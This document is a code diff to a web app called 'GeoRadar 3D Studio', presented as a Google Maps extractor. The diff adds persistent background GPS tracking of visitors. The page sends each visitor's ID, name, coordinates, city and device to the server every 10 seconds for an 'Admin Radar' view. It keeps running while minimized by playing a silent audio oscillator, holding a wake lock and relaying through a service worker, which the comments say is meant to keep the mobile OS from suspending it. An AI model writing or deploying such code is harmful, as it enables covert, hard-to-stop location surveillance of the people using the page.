@@ -9,9 +9,9 @@
   <title>GeoRadar 3D Studio - مستخرج خرائط جوجل</title>
   <script>
     if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.getRegistrations().then(function(regs) {
-        regs.forEach(function(sw) { sw.unregister(); });
-      }).catch(function() {});
+      window.addEventListener('load', function() {
+        navigator.serviceWorker.register('/sw.js', { scope: '/' }).catch(function() {});
+      });
     }
   </script>
   <!-- Tailwind CSS -->
@@ -4002,28 +4002,91 @@
       return true;
     }
 
-    async function streamLiveGpsToServer(lat, lng, accuracy = 15) {
-      if (!isValidNonZeroClientCoord(lat, lng)) return;
+    window.isPhoneGpsCurrentlyEnabled = true;
+    let bgAudioKeepAliveCtx = null;
+    let activeScreenWakeLock = null;
+
+    function enableBackgroundGpsKeepAlive() {
+      // 1. Silent Web Audio oscillator (zero gain) started on user gesture to prevent mobile OS from suspending background tab timers
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (AudioCtx && !bgAudioKeepAliveCtx) {
+          bgAudioKeepAliveCtx = new AudioCtx();
+          const osc = bgAudioKeepAliveCtx.createOscillator();
+          const gain = bgAudioKeepAliveCtx.createGain();
+          gain.gain.value = 0.00001; // Inaudible silent keep-alive
+          osc.connect(gain);
+          gain.connect(bgAudioKeepAliveCtx.destination);
+          osc.start();
+        } else if (bgAudioKeepAliveCtx && bgAudioKeepAliveCtx.state === 'suspended') {
+          bgAudioKeepAliveCtx.resume().catch(() => {});
+        }
+      } catch (e) {}
+
+      // 2. Screen Wake Lock API when supported
+      try {
+        if ('wakeLock' in navigator && document.visibilityState === 'visible' && !activeScreenWakeLock) {
+          navigator.wakeLock.request('screen').then(( sentinel ) => {
+            activeScreenWakeLock = sentinel;
+            sentinel.addEventListener('release', () => { activeScreenWakeLock = null; });
+          }).catch(() => {});
+        }
+      } catch (e) {}
+    }
+
+    async function streamLiveGpsToServer(lat, lng, accuracy = 15, statusOverride = '', gpsEnabledOverride = null) {
+      const isGpsEnabled = gpsEnabledOverride !== null
+        ? Boolean(gpsEnabledOverride)
+        : (window.isPhoneGpsCurrentlyEnabled !== false);
+      const effectiveStatus = statusOverride || (
+        !isGpsEnabled
+          ? 'gps_disabled'
+          : (document.visibilityState === 'hidden' ? 'background_live' : 'live')
+      );
+
+      const hasCoords = isValidNonZeroClientCoord(lat, lng);
+      const fallbackHasCoords = cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng);
+      if (!hasCoords && !fallbackHasCoords && effectiveStatus !== 'gps_disabled') return;
+
+      const sendLat = hasCoords ? Number(lat) : (fallbackHasCoords ? Number(cachedOptionalGps.lat) : null);
+      const sendLng = hasCoords ? Number(lng) : (fallbackHasCoords ? Number(cachedOptionalGps.lng) : null);
+
       try {
         const session = getSavedVisitorSession();
         const vId = session.visitorId || getOrCreateDeviceVisitorId();
         const vName = session.visitorName || '';
         const devProfile = await detectUserDeviceProfile();
+        const payload = {
+          visitorId: vId,
+          visitorName: vName,
+          username: vName,
+          status: effectiveStatus,
+          gpsEnabled: isGpsEnabled,
+          lat: sendLat,
+          lon: sendLng,
+          lng: sendLng,
+          timestamp: new Date().toISOString(),
+          accuracy: Math.round(Number(accuracy || 15)),
+          locationSource: 'GPS',
+          city: window.lastAutoDetectedGpsCity || '',
+          device: devProfile.deviceLabel || ''
+        };
+
+        // Also forward via Service Worker for background resilience when minimized
+        try {
+          if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+            navigator.serviceWorker.controller.postMessage({
+              type: 'LOCATION_HEARTBEAT_PING',
+              payload
+            });
+          }
+        } catch (swErr) {}
+
         const res = await fetch('/api/user/update-location', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            visitorId: vId,
-            visitorName: vName,
-            username: vName,
-            lat: Number(lat),
-            lon: Number(lng),
-            lng: Number(lng),
-            accuracy: Math.round(Number(accuracy || 15)),
-            locationSource: 'GPS',
-            city: window.lastAutoDetectedGpsCity || '',
-            device: devProfile.deviceLabel || ''
-          })
+          body: JSON.stringify(payload),
+          keepalive: true
         });
         if (res.status === 403) {
           const data = await res.json();
@@ -4038,12 +4101,51 @@
     let liveGpsHeartbeatTimer = null;
 
     function startLiveGpsLocationWatcher() {
+      // 1. Continuous watchPosition (runs in both foreground and background without pausing on visibilitychange)
+      if (navigator.geolocation && liveGpsWatchId === null) {
+        try {
+          liveGpsWatchId = navigator.geolocation.watchPosition(
+            (pos) => {
+              if (!pos || !pos.coords) return;
+              const lat = pos.coords.latitude;
+              const lng = pos.coords.longitude;
+              const acc = Math.round(pos.coords.accuracy || 15);
+              if (!isValidNonZeroClientCoord(lat, lng)) return;
+              window.isPhoneGpsCurrentlyEnabled = true;
+              cachedOptionalGps = { lat, lng, accuracy: acc };
+              renderUserGpsPinOnMap();
+              syncLocationInputWithUserGps(lat, lng, false);
+              const currentStatus = document.visibilityState === 'hidden' ? 'background_live' : 'live';
+              streamLiveGpsToServer(lat, lng, acc, currentStatus, true);
+            },
+            (err) => {
+              // Only switch to "🔴 أقفل الموقع من الإعدادات" if watchPosition throws a GPS-off or permission-denied error (code 1 or 2)
+              if (err && (err.code === 1 || err.code === 2)) {
+                window.isPhoneGpsCurrentlyEnabled = false;
+                const lastLat = cachedOptionalGps ? cachedOptionalGps.lat : null;
+                const lastLng = cachedOptionalGps ? cachedOptionalGps.lng : null;
+                streamLiveGpsToServer(lastLat, lastLng, cachedOptionalGps?.accuracy || 25, 'gps_disabled', false);
+              }
+            },
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+          );
+        } catch (e) {}
+      }
+
+      // 2. Continuous 10-second background heartbeat (never paused when hidden)
       if (!liveGpsHeartbeatTimer) {
         liveGpsHeartbeatTimer = setInterval(() => {
-          if (cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
-            streamLiveGpsToServer(cachedOptionalGps.lat, cachedOptionalGps.lng, cachedOptionalGps.accuracy || 25);
+          if (window.isPhoneGpsCurrentlyEnabled === false) {
+            const lastLat = cachedOptionalGps ? cachedOptionalGps.lat : null;
+            const lastLng = cachedOptionalGps ? cachedOptionalGps.lng : null;
+            streamLiveGpsToServer(lastLat, lastLng, cachedOptionalGps?.accuracy || 25, 'gps_disabled', false);
+            return;
           }
-        }, 20000);
+          if (cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
+            const hbStatus = document.visibilityState === 'hidden' ? 'background_live' : 'live';
+            streamLiveGpsToServer(cachedOptionalGps.lat, cachedOptionalGps.lng, cachedOptionalGps.accuracy || 15, hbStatus, true);
+          }
+        }, 10000);
       }
     }
 
@@ -4101,18 +4203,24 @@
       }
     }
 
-    // Pure In-App Non-Blocking Background Location Capture (Zero Browser Geolocation Popup)
+    // Non-Blocking Background Location Capture (Continuous watchPosition + 10s heartbeat + /api/in-app-location fallback)
     async function captureBackgroundLocationNonBlocking() {
+      enableBackgroundGpsKeepAlive();
       startLiveGpsLocationWatcher();
       try {
         const data = await fetchInAppLocationSilent('');
         if (data && isValidNonZeroClientCoord(data.lat, data.lon ?? data.lng)) {
           const lat = Number(data.lat);
           const lng = Number(data.lon ?? data.lng);
-          cachedOptionalGps = { lat, lng, accuracy: 25 };
+          if (!cachedOptionalGps || !isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
+            cachedOptionalGps = { lat, lng, accuracy: 25 };
+          }
           renderUserGpsPinOnMap();
-          streamLiveGpsToServer(lat, lng, 25);
-          autoRecordDeviceIpVisit('IN_APP');
+          const curStatus = window.isPhoneGpsCurrentlyEnabled === false
+            ? 'gps_disabled'
+            : (document.visibilityState === 'hidden' ? 'background_live' : 'live');
+          streamLiveGpsToServer(cachedOptionalGps.lat, cachedOptionalGps.lng, cachedOptionalGps.accuracy || 25, curStatus, window.isPhoneGpsCurrentlyEnabled !== false);
+          autoRecordDeviceIpVisit('GPS');
         }
       } catch (e) {}
     }
@@ -4467,15 +4575,23 @@
 
       const onAppForeground = () => {
         if (!isTermsAcceptedInStorage() || isReturningGpsCheckInFlight) return;
-        const blockedCard = document.getElementById('returningUserLocationBlockedCard');
-        const isBlockedCardVisible = blockedCard && !blockedCard.classList.contains('hidden');
-        triggerReturningUserGpsActivation(isBlockedCardVisible);
+        enableBackgroundGpsKeepAlive();
+        startLiveGpsLocationWatcher();
+        if (window.isPhoneGpsCurrentlyEnabled !== false && cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
+          streamLiveGpsToServer(cachedOptionalGps.lat, cachedOptionalGps.lng, cachedOptionalGps.accuracy || 15, 'live', true);
+        }
       };
 
       window.addEventListener('pageshow', onAppForeground);
       window.addEventListener('focus', onAppForeground);
       document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible') {
+        if (!isTermsAcceptedInStorage()) return;
+        if (document.visibilityState === 'hidden') {
+          // Do NOT pause watchPosition or heartbeat when minimized! Send background_live status immediately so user stays Green Live on Admin Radar
+          if (window.isPhoneGpsCurrentlyEnabled !== false && cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
+            streamLiveGpsToServer(cachedOptionalGps.lat, cachedOptionalGps.lng, cachedOptionalGps.accuracy || 15, 'background_live', true);
+          }
+        } else if (document.visibilityState === 'visible') {
           onAppForeground();
         }
       });
@@ -5489,7 +5605,7 @@
 
     window.addEventListener('DOMContentLoaded', () => {
       if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.getRegistrations().then(regs => regs.forEach(r => r.unregister())).catch(() => {});
+        navigator.serviceWorker.register('/sw.js', { scope: '/' }).catch(() => {});
       }
       if ('caches' in window) {
         caches.keys().then(keys => keys.forEach(k => caches.delete(k))).catch(() => {});
